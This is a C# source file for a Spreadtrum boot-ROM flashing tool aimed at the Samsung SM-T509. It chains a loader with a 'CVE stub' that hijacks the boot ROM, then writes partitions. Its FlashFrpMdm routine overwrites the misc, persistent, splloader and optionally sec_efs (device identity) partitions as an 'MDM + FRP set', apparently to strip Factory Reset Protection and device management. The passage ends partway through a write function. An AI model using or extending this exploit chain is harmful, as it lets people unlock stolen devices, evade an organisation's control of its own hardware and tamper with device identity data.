using System;
using System.Buffers.Binary;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.IO;
using System.IO.Ports;
using System.Linq;
using System.Text;
using System.Threading;
using Brom.Services;

namespace Brom.T509Native
{
    /// <summary>Where the device should end up after a Fix Handshake run.</summary>
    public enum T509BootTarget
    {
        /// <summary>Leave FDL1 running and let the device continue its normal boot.</summary>
        Android = 0,

        /// <summary>Upload only and stay put: no reset, so the device remains in
        /// BROM (1782:4D00) instead of booting Android.</summary>
        Brom = 1
    }

    public sealed class T509RunResult
    {
        public bool Ok;
        public bool AnyWriteAttempted;
        public string Port;
        public string Error;
    }

    /// <summary>
    /// In-process BROM engine for the T509 (SM-T509).
    ///
    /// This is the "SPD Client Core" code integrated into Brom: the
    /// protocol stack vendored under SprdNative/ (SPRDClientCore, GPLv3) is
    /// driven directly from this process.
    ///
    /// Chain (proven takeover sequence):
    ///   BROM  -> FDL1 (0x5500) + CVE stub (0x3EE8, no END_DATA)
    ///         -> FDL1 handshake (CHECK_BAUD + CONNECT)
    ///         -> FDL2 (0x9EFFFE00) + EXEC
    ///         -> partition writes with read-back verification
    ///         -> NORMAL_RESET
    /// </summary>
    public static class T509Engine
    {
        public const uint FDL1_ADDR = 0x5500;
        public const uint STUB_ADDR = 0x3EE8;
        public const uint FDL2_ADDR = 0x9EFFFE00;

        /// <summary>Force-dispose all active protocol handlers. Called by the
        /// STOP button so blocked USB I/O is aborted immediately.</summary>
        public static void CancelAllHandlers()
        {
            SprdProtocolHandler.CancelAll();
        }

        const int BROM_BAUD = 115200;
        const int UPLOAD_BLOCK = 528;      // proven BROM/FDL block size
        const int FDL1_SETTLE_MS = 15000;  // FDL1 inits DRAM/clocks + re-enumerates USB
        const int FDL2_SETTLE_MS = 5000;   // FDL1 finalises the image before EXEC

        sealed class Session : IDisposable
        {
            public SprdProtocolHandler Handler;
            public SprdFlashUtils Utils;
            public string Port;
            public Stages Stage;
            public Stages SprdMode;
            public bool WritesStarted;

            public void Dispose()
            {
                try { Handler?.Dispose(); } catch { }
            }
        }

        /// <summary>Strip non-Latin (Chinese/Korean/Japanese) characters.</summary>
        static string CleanSprd(string s)
        {
            if (string.IsNullOrEmpty(s)) return string.Empty;
            var sb = new System.Text.StringBuilder();
            foreach (char ch in s)
            {
                if (ch < 128 || char.IsWhiteSpace(ch)) sb.Append(ch);
            }
            string r = sb.ToString().Trim();
            while (r.Contains("  ")) r = r.Replace("  ", " ");
            return r;
        }

        // =================================================================
        //  FRP + MDM  (in-process, no external exe)
        // =================================================================
        /// <summary>
        /// Writes misc + persistent + sec_efs (optional) + splloader (last) in
        /// one verified FDL2 session. This is the MDM + FRP set; sec_efs holds
        /// device identity data and is only written when explicitly allowed.
        /// </summary>
        public static T509RunResult FlashFrpMdm(ILogSink log, string port,
            bool allowSecEfs, CancellationToken token)
        {
            log ??= NullLogSink.Instance;
            var paths = PathManager.Instance;
            string bins = paths.GetT509BinsPath();

            var jobs = new List<(string Name, string Path)>
            {
                ("misc", Path.Combine(bins, "misc.bin")),
                ("persistent", Path.Combine(bins, "persistent.bin")),
            };

            string secEfs = Path.Combine(bins, "sec_efs.bin");
            if (allowSecEfs)
            {
                jobs.Add(("sec_efs", secEfs));
            }

            jobs.Add(("splloader", Path.Combine(bins, "splloader.bin")));

            return FlashJobs(log, port, jobs, reboot: true, token);
        }

        /// <summary>Generic verified write set (used by Format / FRP-MDM).</summary>
        public static T509RunResult FlashPartitions(ILogSink log, string port,
            IReadOnlyList<(string Name, string Path)> jobs, bool reboot, CancellationToken token)
            => FlashJobs(log, port, jobs, reboot, token);

        static T509RunResult FlashJobs(ILogSink log, string port,
            IReadOnlyList<(string Name, string Path)> jobs, bool reboot, CancellationToken token)
        {
            log ??= NullLogSink.Instance;
            var result = new T509RunResult();
            try
            {
                if (jobs == null || jobs.Count == 0)
                {
                    result.Error = "no partitions selected";
                    log.LogError(result.Error);
                    return result;
                }

                var images = new List<(string Name, string Path, long Size)>();
                foreach (var job in jobs)
                {
                    if (!File.Exists(job.Path) || new FileInfo(job.Path).Length == 0)
                    {
                        result.Error = $"Missing image: {job.Path}";
                        log.LogError(result.Error);
                        return result;
                    }
                    images.Add((job.Name, job.Path, new FileInfo(job.Path).Length));
                }

                var paths = PathManager.Instance;
                string p = ResolvePort(port, log, token);
                if (string.IsNullOrWhiteSpace(p))
                {
                    result.Error = "No BROM COM port detected.";
                    log.LogError("No BROM port - put the device in BROM.");
                    return result;
                }
                result.Port = p;



                // uboot.bin (641 KB) is the preferred FDL2 image. fdl2-dl.bin
                // (895 KB) is kept as fallback.
                // T509 loader paths take priority for T509 devices
                string fdl2 = paths.GetFdl2Path();
                if (!File.Exists(fdl2)) fdl2 = paths.GetT509UbootPath();
                if (!File.Exists(fdl2)) fdl2 = paths.GetT509Fdl2DlPath();
                if (!File.Exists(fdl2)) fdl2 = paths.GetT509Fdl2Path();
                if (!File.Exists(fdl2))
                {
                    result.Error = $"Missing FDL2 loader: {fdl2}";
                    log.LogError(result.Error);
                    return result;
                }
                long fdl2Size = new FileInfo(fdl2).Length;

                Field(log, "Port", p + " @ " + BROM_BAUD);
                Field(log, "Loader", Path.GetFileName(fdl2) + " (" + fdl2Size + " bytes)");
                Field(log, "Partitions", images.Count + " partitions to write");
                Rule(log);

                using var session = BringUpFdl1(log, p, token);
                result.Port = session.Port;

                LoadFdl2(session, fdl2, log, token);

                Rule(log);
                int written = 0;
                foreach (var job in images)
                {
                    token.ThrowIfCancellationRequested();

                    if (!session.Utils.CheckPartitionExist(job.Name))
                    {
                        if (string.Equals(job.Name, "sec_efs", StringComparison.OrdinalIgnoreCase))
                        {
                            Field(log, job.Name, "not on device - skipped");
                            continue;
                        }
                        throw new InvalidOperationException(
                            "partition '" + job.Name + "' not found on this device.");
                    }

                    session.WritesStarted = true;
                    result.AnyWriteAttempted = true;
                    // Give FDL2 a moment to settle after EXEC before writing.
                    Sleep(3000, token);
                    int writeTries = 0;
                    while (true)
                    {
                        try
                        {
                            WritePartitionOnly(session, job.Name, job.Path, log);
                            written++;
                            break;
                        }
                        catch (Exception ex) when (ex is IOException ||
                                                   ex is OperationCanceledException ||
                                                   ex is SprdException)
                        {
                            token.ThrowIfCancellationRequested();
                            if (++writeTries >= 3) throw;
                            log.LogWarning("writing " + job.Name + " failed - retrying...");
                            try { session.Handler?.Dispose(); } catch { }
                            Session again = HandshakeFdl1(session.Port, 120, log, token);
                            session.Handler = again.Handler;
                            session.Utils = again.Utils;
                            session.Port = again.Port;
                            session.Stage = again.Stage;
                            session.SprdMode = again.SprdMode;
                            LoadFdl2(session, fdl2, log, token);
                            Sleep(3000, token);
                        }
                    }
                }

                Rule(log);
                if (reboot)
                {
                    Field(log, "Reset", "restarting device");
                    TryReset(session.Utils, NullLogSink.Instance);
                }
                else
                {
                    Field(log, "Reset", "skipped - stays in download mode");
                }

                result.Ok = true;
                log.LogSuccess(FieldLine("Result", "done - " + written + "/" + images.Count + " written."));
                return result;
            }
            catch (OperationCanceledException)
            {
                result.Error = "cancelled";
                log.LogWarning("T509 flash cancelled.");
                return result;
            }
            catch (Exception ex)
            {
                result.Error = ex.Message;
                string reason = Friendly(ex);
                log.LogError(FieldLine("Result", "Failed - " + reason));
                if (reason.StartsWith("port busy", StringComparison.Ordinal))
                    log.LogWarning(FieldLine("Tip", "close other tools, retry"));
                return result;
            }
        }

        // =================================================================
        //  Fix Handshake
        // =================================================================
        public static T509RunResult FixHandshake(ILogSink log, string port, T509BootTarget target,
            CancellationToken token)
        {
            log ??= NullLogSink.Instance;
            var result = new T509RunResult();
            try
            {
                var paths = PathManager.Instance;
                byte[] spl = LoadFdl1(paths, NullLogSink.Instance, out string payloadName);

                string pp = ResolvePort(port, log, token);
                if (string.IsNullOrWhiteSpace(pp))
                {
                    result.Error = "No BROM COM port detected.";
                    log.LogError(result.Error);
                    return result;
                }
                result.Port = pp;

                Field(log, "Port", pp + " @ " + BROM_BAUD);
                Field(log, "Payload", $"{payloadName} ({spl.Length:N0} B)");
                Field(log, "Address", $"0x{FDL1_ADDR:X8}");

                var handler = new SprdProtocolHandler(pp, new HdlcEncoder(), BROM_BAUD)
                {
                    Verbose = false
                };
                var utils = new SprdFlashUtils(handler, m => { /* SPRD handshake traces suppressed for clean logs */ })
                {
                    Timeout = 30000
                };

                try
                {
                    var stages = utils.ConnectToDevice();
                    Field(log, "Stage", stages.Stage + " (" + stages.SprdMode + ")");
                    if (stages.Stage != Stages.Brom)
                        throw new InvalidOperationException(
                            "device is already in " + stages.Stage + " - power-cycle into BROM and retry");

                    Upload(utils, spl, FDL1_ADDR, "Upload", sendEndData: true, log, token);
                    token.ThrowIfCancellationRequested();

                    // BROM target is a "refresh": the SPL is already in SRAM and
                    // the device is still sitting in download mode, so there is
                    // nothing to reboot into. Resetting here would drop the
                    // freshly uploaded image and start a full boot cycle, which
                    // is exactly what the operator does not want.
                    if (target == T509BootTarget.Android)
                    {
                        Field(log, "Boot", "executing SPL from RAM");
                        try
                        {
                            utils.Handler.SendPacketAndReceive(BSL_CMD_EXEC_DATA);
                            Field(log, "Exec", "EXEC_DATA accepted");
                        }
                        catch (Exception ex)
                        {
                            // The SPL takes over the USB endpoint on EXEC, so
                            // a missing ACK is expected and not a failure.
                            Field(log, "Exec", "EXEC_DATA sent (" + ex.GetType().Name + ")");
                        }
                    }
                    else
                    {
                        Field(log, "Boot", "left in BROM - no reset");
                    }
                }
                finally
                {
                    try { handler.Dispose(); } catch { }
                }

                result.Port = pp;
                result.Ok = true;
                log.LogSuccess(FieldLine("Result", target == T509BootTarget.Brom
                    ? "Done - device stays in BROM."
                    : "Done - chain-boot sent (RAM only)."));
                return result;
            }
            catch (OperationCanceledException)
            {
                result.Error = "cancelled";
                log.LogWarning("Fix Handshake cancelled.");
                return result;
            }
            catch (Exception ex)
            {
                result.Error = ex.Message;
                log.LogError(FieldLine("Result", "Failed - " + Friendly(ex)));
                return result;
            }
        }

        /// <summary>
        /// Real BROM -> FDL1 takeover used by the BROM tab's Force BROM flow:
        /// uploads the download build (<c>fdl1-dl.bin</c>) plus the 128-byte CVE
        /// stub, waits for the loader to answer on a fresh handle, and returns
        /// the port now sitting in download mode. No flash write.
        /// </summary>
        public static string EnterDownloadMode(ILogSink log, string port, CancellationToken token)
        {
            log ??= NullLogSink.Instance;
            Session session = BringUpFdl1(log, port, token);
            try
            {
                return session.Port;
            }
            finally
            {
                session.Dispose();
            }
        }

        // =================================================================
        //  Reboot into BROM: run the download loader from SRAM, no flash write
        // =================================================================
        /// <summary>
        /// Puts the device back into download mode (1782:4D00) without writing
        /// anything to flash.
        ///
        /// <c>bins/t509/splloader.bin</c> is the <b>boot</b> SPL: its whole job
        /// is to load u-boot and start Android, so executing it always ends in
        /// a normal boot - that is exactly what it did on hardware. The
        /// <b>download</b> build of the same SPL (<c>loaders/T509/fdl1-dl.bin</c>)
        /// instead stays in download mode and waits for commands, which is the
        /// behaviour wanted here.
        ///
        /// So: upload fdl1-dl.bin to 0x5500, upload the CVE stub to 0x3EE8
        /// (the hijack hands control to the loader, no END_DATA needed), then
        /// watch the COM port drop and come back as BROM.
        ///
        /// No partition write, no BCB, no NORMAL_RESET - SRAM only.
        /// </summary>
        public static T509RunResult RefreshSplToBrom(ILogSink log, string port,
            int bromWaitSeconds, CancellationToken token)
        {
            log ??= NullLogSink.Instance;
            var result = new T509RunResult();
            var trace = new CmdTrace();
            try
            {
                var paths = PathManager.Instance;

                // T509_Fix.bin is the proven payload: its 0x5500 blob is
                // byte-identical to bins/t509/splloader.bin (62,420 B). It runs
                // the CVE hijack, then the device is reset - no Android boot,
                // no download mode, no probe loop.
                byte[] spl = LoadFixSpl(paths, NullLogSink.Instance);
                byte[] stub = LoadStub(paths, NullLogSink.Instance);

                string pp = ResolvePort(port, log, token);
                if (string.IsNullOrWhiteSpace(pp))
                {
                    result.Error = "No BROM COM port detected.";
                    log.LogError(result.Error);
                    return result;
                }
                result.Port = pp;

                Field(log, "Port", pp + " @ " + BROM_BAUD);
                Field(log, "Step", Step("connect"));
                Rule(log);

                var handler = new SprdProtocolHandler(pp, new HdlcEncoder(), BROM_BAUD)
                {
                    Verbose = false,
                    CommandTrace = trace.Add
                };
                var utils = new SprdFlashUtils(handler, m => { /* SPRD handshake traces suppressed for clean logs */ })
                {
                    Timeout = 1500
                };

                bool resetOk = false;
                try
                {
                    var stages = utils.ConnectToDevice();
                    Field(log, "Stage", stages.Stage + " (" + stages.SprdMode + ")");

                    if (stages.Stage != Stages.Brom)
                        throw new InvalidOperationException(
                            "device is not in boot mode - restart device and try again");

                    // Upload SPL + CVE stub. Hijack fires inside the stub upload.
                    Field(log, "Step", Step("upload"));

                    // Upload SPL first. If it fails partway, the stub may still
                    // load and hijack - try anyway.
                    try
                    {
                        Upload(utils, spl, FDL1_ADDR, "Upload", sendEndData: true, log, token);
                    }
                    catch
                    {
                        // SPL upload failed partway - stub may still hijack.
                        Field(log, "Upload", "SPL upload failed - trying stub anyway...");
                    }
                    token.ThrowIfCancellationRequested();

                    // Stub upload: hijack fires inside the last MIDST_DATA block.
                    // If upload fails mid-stub, the hijack may already have fired
                    // - treat as success (loader is running).
                    try
                    {
                        Upload(utils, stub, STUB_ADDR, "Stub", sendEndData: false, log, token);
                        Field(log, "Stub", "boot mode unlocked");
                    }
                    catch
                    {
                        // Hijack likely fired during last block - port died as
                        // expected. Treat as success.
                        Field(log, "Stub", "hijack fired (loader running)");
                    }

                    // The hijack has fired - loader is running. USB endpoint may
                    // drop as the loader re-initialises. Reset is best-effort:
                    // if it fails, the takeover still succeeded.
                    Field(log, "Step", Step("reset"));
                    Field(log, "Poweroff", "restarting device");
                    try
                    {
                        utils.Handler.SendPacketAndReceive((SprdCommand)0x0005);
                        resetOk = true;
                    }
                    catch
                    {
                        // Handler may be dead after hijack - try raw frame
                    }

                    if (!resetOk)
                    {
                        try
                        {
                            using var sp = new System.IO.Ports.SerialPort(pp, BROM_BAUD, System.IO.Ports.Parity.None, 8, System.IO.Ports.StopBits.One)
                            {
                                ReadTimeout = 1500,
                                WriteTimeout = 1500,
                                DtrEnable = true,
                                RtsEnable = true
                            };
                            sp.Open();
                            byte[] resetCmd = { 0x7E, 0x00, 0x05, 0x00, 0x00, 0xFF, 0xFA, 0x7E };
                            sp.Write(resetCmd, 0, resetCmd.Length);
                            sp.BaseStream.Flush();
                            resetOk = true;
                        }
                        catch { /* port dead - hijack already fired */ }
                    }

                    Thread.Sleep(500);
                }
                finally
                {
                    try { handler.Dispose(); } catch { }
                }

                result.Ok = true;
                log.LogSuccess(FieldLine("Result", "done - loader running (BROM -> FDL1)."));
                return result;
            }
            catch (OperationCanceledException)
            {
                result.Error = "cancelled";
                if (trace.Any) Rule(log);
                log.LogWarning(FieldLine("Result", "Cancelled - nothing written"));
                return result;
            }
            catch (Exception ex)
            {
                result.Error = ex.Message;
                if (trace.Any) Rule(log);
                log.LogError(FieldLine("Result", "Failed - " + Friendly(ex)));
                return result;
            }
        }

        // =================================================================
        //  USB re-enumeration watch
        // =================================================================
        static bool PortPresent(string port)
        {
            try
            {
                return SerialPort.GetPortNames()
                    .Any(p => p.Equals(port, StringComparison.OrdinalIgnoreCase));
            }
            catch { return false; }
        }

        /// <summary>
        /// Probes the candidate ports and returns the first one that answers as
        /// something other than BROM (FDL1 / download mode). BROM answers
        /// CHECK_BAUD too, so the stage - not the reply - is what decides.
        /// </summary>
        static (string Port, Stages Stage)? ProbeDownloadMode(string preferred, CmdTrace trace,
            CancellationToken token, out bool wedged)
        {
            wedged = false;
            string[] ports;
            try { ports = SerialPort.GetPortNames().Distinct().ToArray(); }
            catch { ports = new[] { preferred }; }
            if (ports.Length == 0) ports = new[] { preferred };

            foreach (string p in ports)
            {
                token.ThrowIfCancellationRequested();

                // Only touch our own port or something that enumerates as the
                // Spreadtrum node - never open a random Bluetooth COM.
                if (!p.Equals(preferred, StringComparison.OrdinalIgnoreCase) && !UsbIds.IsBrom(p))
                    continue;

                try
                {
                    using var h = new SprdProtocolHandler(p, new HdlcEncoder(), BROM_BAUD)
                    {
                        Verbose = false,
                        // One re-send is enough while polling: the loader is
                        // either up or it is not. The library default of 5
                        // turned a silent port into a 6 s wait per round.
                        Retries = 1
                    };
                    if (trace != null) h.CommandTrace = trace.Add;
                    var u = new SprdFlashUtils(h, m => { /* quiet probe */ })
                    {
                        Timeout = 1200
                    };
                    var st = u.ConnectToDevice();
                    if (st.Stage != Stages.Brom)
                        return (p, st.Stage);
                }
                catch (IOException)
                {
                    // The handle opened but the write died: the endpoint is
                    // gone (a wedged loader). That is not "not up yet", so stop
                    // polling - every further round only pays the driver
                    // timeout again.
                    wedged = true;
                    _hungPorts[p] = DateTime.UtcNow;
                    return null;
                }
                catch { /* not up yet - keep polling */ }
            }

            return null;
        }

        // =================================================================
        //  Codes / identity read-out (BROM query path)
        // =================================================================
        public static bool ReadCodes(ILogSink log, string port, CancellationToken token)
        {
            log ??= NullLogSink.Instance;
            string p = ResolvePort(port, log, token, seconds: 5);
            if (string.IsNullOrWhiteSpace(p))
            {
                log.LogError("No BROM port for the code read-out.");
                return false;
            }

            SprdProtocolHandler handler = null;
            try
            {
                handler = new SprdProtocolHandler(p, new HdlcEncoder(), BROM_BAUD)
                {
                    Verbose = false
                };
                var utils = new SprdFlashUtils(handler, m => { /* SPRD handshake traces suppressed for clean logs */ })
                {
                    Timeout = 3000
                };

                var stages = utils.ConnectToDevice();
                log.LogInfo($"Port {p}: stage={stages.Stage}, protocol={stages.SprdMode}.");

                Query(handler, BSL_CMD_CHECK_BAUD, "BROM version", log);
                Query(handler, BSL_CMD_READ_CHIP_TYPE, "Chip type", log);
                Query(handler, BSL_CMD_READ_CHIP_UID, "Chip UID", log);
                Query(handler, BSL_CMD_READ_FLASH_UID, "Flash UID", log);
                Query(handler, BSL_CMD_READ_FLASH_TYPE, "Flash type", log);
                Query(handler, BSL_CMD_READ_FLASH_INFO, "Flash info", log);
                return true;
            }
            catch (Exception ex)
            {
                log.LogError($"Code read-out failed: {ex.Message}");
                return false;
            }
            finally
            {
                try { handler?.Dispose(); } catch { }
            }
        }

        /// <summary>
        /// Best-effort chip identification for the BROM read-out. Returns
        /// the ASCII chip name when the BROM/FDL1 answers READ_CHIP_TYPE, the
        /// raw hex otherwise, and null when the query is not supported. Never
        /// throws: a missing answer only means "unknown chip".
        /// </summary>
        public static string ReadChipType(string port)
        {
            SprdProtocolHandler handler = null;
            try
            {
                handler = new SprdProtocolHandler(port, new HdlcEncoder(), BROM_BAUD)
                {
                    Verbose = false
                };
                var utils = new SprdFlashUtils(handler, m => { /* quiet */ })
                {
                    Timeout = 3000
                };
                utils.ConnectToDevice();

                var reply = handler.SendPacketAndReceive(BSL_CMD_READ_CHIP_TYPE);
                string ascii = ToAscii(reply.Data);
                if (!string.IsNullOrWhiteSpace(ascii))
                    return ascii.Trim();
                if (reply.Data != null && reply.Data.Length > 0)
                    return "0x" + BitConverter.ToString(reply.Data).Replace("-", "");
                return null;
            }
            catch
            {
                return null;
            }
            finally
            {
                try { handler?.Dispose(); } catch { }
            }
        }

        /// <summary>
        /// Reads the real partition table from a device that is already in
        /// download mode (FDL1). The vendored stack tries the EFI table inside
        /// <c>user_partition</c> first, then the READ_PARTITION packet, then a
        /// traversal of the common partition names. Returns null when the device
        /// is still in BROM (the table needs the loader) or does not answer.
        /// Nothing is written.
        /// </summary>
        public static List<(string Name, ulong Size)> ReadPartitionTable(ILogSink log,
            string port, CancellationToken token)
        {
            log ??= NullLogSink.Instance;
            SprdProtocolHandler handler = null;
            try
            {
                handler = new SprdProtocolHandler(port, new HdlcEncoder(), BROM_BAUD)
                {
                    Verbose = false
                };
                var utils = new SprdFlashUtils(handler, m => { /* quiet table probes */ })
                {
                    Timeout = 15000
                };

                var stages = utils.ConnectToDevice();
                if (stages.Stage == Stages.Brom)
                {
                    log.LogWarning(FieldLine("Partitions", "BROM - run BOOT/CONNECT first"));
                    return null;
                }

                var (parts, method) = utils.GetPartitionsAndStorageInfo();
                token.ThrowIfCancellationRequested();

                var list = new List<(string Name, ulong Size)>();
                var seen = new HashSet<string>(StringComparer.OrdinalIgnoreCase);
                foreach (var p in parts)
                {
                    token.ThrowIfCancellationRequested();
                    string name = (p.Name ?? "").Trim('\0', ' ');
                    if (name.Length == 0 || !seen.Add(name)) continue;
                    list.Add((name, p.Size));
                }

                Field(log, "Table", method switch
                {
                    GetPartitionsMethod.ConvertExtTable => "EFI user_partition",
                    GetPartitionsMethod.SendReadPartitionPacket => "READ_PARTITION packet",
                    _ => "common-name traversal"
                });
                Field(log, "Partitions", $"{list.Count} read from device");
                return list;
            }
            catch (Exception ex)
            {
                log.LogWarning(FieldLine("Partitions", "read failed - " + Friendly(ex)));
                return null;
            }
            finally
            {
                try { handler?.Dispose(); } catch { }
            }
        }

        // =================================================================
        //  Port liveness
        // =================================================================
        /// <summary>
        /// True when the port answers the SPD handshake right now. Windows keeps
        /// a SERIALCOMM entry after the device re-enumerates (MTP / modem), so a
        /// name match alone can point at a dead or foreign port - writing SPD to
        /// it fails with "The semaphore timeout period has expired".
        ///
        /// This is on the operator's critical path, so it is deliberately cheap:
        /// one handshake, no re-send retries, a 700 ms read timeout, a bounded
        /// wait and a short negative cache. A wedged endpoint answers "no" in
        /// about a second instead of stalling on the driver's 4.5 s semaphore
        /// timeout, and every later check in the next few seconds is free.
        /// </summary>
        public static bool PortAnswers(string port, int timeoutMs = 700)
        {
            if (string.IsNullOrWhiteSpace(port)) return false;

            // A port that just failed is not asked again straight away. The
            // verdict expires on its own, so a replug is picked up without any
            // extra bookkeeping (and a real answer always clears it).
            if (_hungPorts.TryGetValue(port, out DateTime hungAt) &&
                (DateTime.UtcNow - hungAt).TotalSeconds < HungPortTtlSeconds)
                return false;

            SprdProtocolHandler handler = null;
            bool answered = false;
            // The write to a wedged CDC endpoint blocks inside the USB driver
            // for ~4.5 s (semaphore timeout) before it fails. Waiting for that
            // is what made the button feel frozen, so the probe runs on its own
            // thread and we stop waiting after a budget: still blocked means
            // "not answering". The thread owns and disposes its handler.
            var probe = new Thread(() =>
            {
                try
                {
                    handler = new SprdProtocolHandler(port, new HdlcEncoder(), BROM_BAUD)
                    {
                        Verbose = false,
                        Retries = 0
                    };
                    var utils = new SprdFlashUtils(handler, m => { /* quiet probe */ })
                    {
                        Timeout = timeoutMs
                    };
                    utils.ConnectToDevice();
                    answered = true;
                }
                catch { answered = false; }
                finally { try { handler?.Dispose(); } catch { } }
            })
            {
                IsBackground = true,
                Name = "spd-liveness"
            };
            probe.Start();

            if (!probe.Join(timeoutMs + 500))
            {
                // Still stuck in the driver - that is the answer.
                _hungPorts[port] = DateTime.UtcNow;
                return false;
            }

            if (answered)
            {
                _hungPorts.TryRemove(port, out _);
                return true;
            }

            _hungPorts[port] = DateTime.UtcNow;
            return false;
        }

        static readonly ConcurrentDictionary<string, DateTime> _hungPorts =
            new(StringComparer.OrdinalIgnoreCase);

        /// <summary>How long a failed liveness check is trusted. Short enough
        /// that a replug is never blocked, long enough to stop a retry loop
        /// from re-paying the USB timeout on every press.</summary>
        const int HungPortTtlSeconds = 10;

        /// <summary>True when the last liveness check on this port failed and
        /// the verdict is still fresh. A port that vanished from the live COM
        /// list (a replug) drops its verdict immediately, so the next press is
        /// never blocked by a stale "hung" state.</summary>
        public static bool PortKnownHung(string port)
        {
            if (string.IsNullOrWhiteSpace(port)) return false;
            if (!_hungPorts.TryGetValue(port, out DateTime hungAt)) return false;

            if ((DateTime.UtcNow - hungAt).TotalSeconds >= HungPortTtlSeconds || !PortPresent(port))
            {
                _hungPorts.TryRemove(port, out _);
                return false;
            }
            return true;
        }

        // =================================================================
        //  Partition I/O  (BROM: read / write / erase / full dump)
        //
        //  Every entry point below opens its own download-mode session, so the
        //  operator never has to keep a hidden handle alive between button
        //  presses. The device must already be in FDL1 (BOOT/CONNECT); a BROM
        //  stage is reported instead of being silently taken over, because a
        //  flash button must never start a takeover on its own.
        // =================================================================
        sealed class PartIo : IDisposable
        {
            public SprdProtocolHandler Handler;
            public SprdFlashUtils Utils;

            public void Dispose()
            {
                try { Handler?.Dispose(); } catch { }
            }
        }

        static PartIo OpenDownload(string port, ILogSink log, CancellationToken token)
        {
            Exception last = null;

            // Try the given port first. If it is stale (device re-enumerated
            // under a different COM number after the CVE hijack), fall back to
            // scanning every Spreadtrum COM node until one answers as FDL1.
            string[] candidates = ScanSpreadtrumPorts(port);

            // Two passes: Windows sometimes needs a moment to release a stale
            // COM handle after the loader re-enumerates USB. If the first pass
            // fails entirely, wait 2s and scan again.
            for (int pass = 0; pass < 2; pass++)
            {
                if (pass > 0)
                {
                    log.LogDebug($"Download port(s) unresponsive - waiting 2s for re-enumeration...");
                    Sleep(2000, token);
                    token.ThrowIfCancellationRequested();
                    candidates = ScanSpreadtrumPorts(port);
                }

                foreach (string cand in candidates)
                {
                    token.ThrowIfCancellationRequested();
                    var handler = new SprdProtocolHandler(cand, new HdlcEncoder(), BROM_BAUD)
                    {
                        Verbose = false
                    };
                    var utils = new SprdFlashUtils(handler, m => { /* quiet - the block below is the log */ })
                    {
                        Timeout = 15000
                    };

                    try
                    {
                        var stages = utils.ConnectToDevice();
                        token.ThrowIfCancellationRequested();
                        if (stages.Stage == Stages.Brom)
                            throw new InvalidOperationException(
                                "device is in BROM - run BOOT/CONNECT first");

                        return new PartIo { Handler = handler, Utils = utils };
                    }
                    catch (Exception ex)
                    {
                        last = ex;
                        string msg = Clean(ex.Message);
                        if (msg.Contains("denied", StringComparison.OrdinalIgnoreCase) ||
                            msg.Contains("semaphore", StringComparison.OrdinalIgnoreCase))
                        {
                            log.LogDebug($"Download port {cand} stale ({msg}) - trying next...");
                        }
                        else
                        {
                            log.LogDebug($"Download port {cand} not FDL1 ({ex.GetType().Name}) - trying next...");
                        }
                        try { handler.Dispose(); } catch { }
                    }
                }
            }

            throw new InvalidOperationException(
                $"No usable download-mode port found ({Friendly(last ?? new IOException("no answer"))})", last);
        }

        /// <summary>
        /// Builds an ordered list of candidate COM ports: the preferred port
        /// first, then every other Spreadtrum USB serial node (any 1782: PID).
        /// This covers the case where the device re-enumerates under a new COM
        /// number after the CVE hijack / BROM -> FDL1 takeover.
        /// </summary>
        static string[] ScanSpreadtrumPorts(string preferred)
        {
            var result = new List<string>();
            if (!string.IsNullOrEmpty(preferred))
                result.Add(preferred);

            try
            {
                foreach (string p in SerialPort.GetPortNames().Distinct())
                {
                    if (p.Equals(preferred, StringComparison.OrdinalIgnoreCase)) continue;
                    if (UsbIds.IsSpreadtrum(p))
                        result.Add(p);
                }
            }
            catch { /* best effort */ }

            return result.Count > 0 ? result.ToArray() : new[] { preferred ?? string.Empty };
        }

        /// <summary>Reads the named partitions into <paramref name="folder"/> as
        /// raw <c>.bin</c> images. Read-only: nothing is written to the device.</summary>
        public static int ReadPartitionsToFolder(ILogSink log, string port,
            IReadOnlyList<string> names, string folder, CancellationToken token)
        {
            log ??= NullLogSink.Instance;
            int ok = 0;

            Rule(log);
            Field(log, "Port", port);
            Field(log, "Mode", "download mode (FDL1)");
            Field(log, "Folder", folder);
            Field(log, "Count", names.Count + " selected");
            Rule(log);

            try
            {
                using var io = OpenDownload(port, log, token);
                foreach (string name in names)
                {
                    token.ThrowIfCancellationRequested();
                    string part = (name ?? "").Trim();
                    if (part.Length == 0) continue;

                    Action<int> onPct = null;
                    try
                    {
                        ulong size = io.Utils.GetPartitionSize(part);
                        string file = Path.Combine(folder, SafeFileName(part) + ".bin");
                        int lastPct = -1;
                        onPct = pct =>
                        {
                            int bucket = pct / 25 * 25;
                            if (bucket == lastPct || bucket == 0) return;
                            lastPct = bucket;
                            Field(log, "Progress", part + " " + bucket + "%");
                        };
                        io.Utils.UpdatePercentage += onPct;

                        using (var fs = new FileStream(file, FileMode.Create, FileAccess.Write, FileShare.None))
                        {
                            io.Utils.ReadPartitionCustomize(fs, part, size);
                        }

                        ok++;
                        Field(log, "Read", $"{part} - {FormatBytes(size)}");
                    }
                    catch (OperationCanceledException) { throw; }
                    catch (Exception ex)
                    {
                        log.LogWarning(FieldLine("Read", $"{part} - {Short(ex)}"));
                    }
                    finally
                    {
                        if (onPct != null) io.Utils.UpdatePercentage -= onPct;
                    }
                }
            }
            catch (Exception ex)
            {
                log.LogWarning(FieldLine("Read", Friendly(ex)));
            }

            Rule(log);
            string summary = $"{ok}/{names.Count} partitions read";
            if (ok == names.Count) log.LogSuccess(FieldLine("Result", summary));
            else log.LogWarning(FieldLine("Result", summary));
            return ok;
        }

        /// <summary>Writes one image to one partition and verifies it by reading
        /// the same byte range back. The image must not be larger than the
        /// partition.</summary>
        public static bool WritePartitionFromFile(ILogSink log, string port,
            string name, string file, CancellationToken token)
        {
            log ??= NullLogSink.Instance;
            string part = (name ?? "").Trim();
            var info = new FileInfo(file);

            Rule(log);
            Field(log, "Port", port);
            Field(log, "Mode", "download mode (FDL1)");
            Field(log, "Partition", part);
            Field(log, "Image", info.Name);
            Field(log, "Size", FormatBytes((ulong)info.Length));
            Rule(log);

            try
            {
                using var io = OpenDownload(port, log, token);

                ulong capacity = io.Utils.GetPartitionSize(part);
                Field(log, "Capacity", FormatBytes(capacity));
                if (capacity > 0 && (ulong)info.Length > capacity)
                    throw new InvalidOperationException(
                        $"image is {FormatBytes((ulong)info.Length)}, partition is {FormatBytes(capacity)}");

                Action<int> onPct = pct =>
                {
                    if (pct % 25 != 0) return;
                    Field(log, "Progress", part + " " + pct + "%");
                };
                io.Utils.UpdatePercentage += onPct;

                try
                {
                    // WritePartition(Stream) takes ownership of the stream and
                    // disposes it; it writes from offset 0 for exactly data.Length.
                    io.Utils.WritePartition(part, File.OpenRead(file));
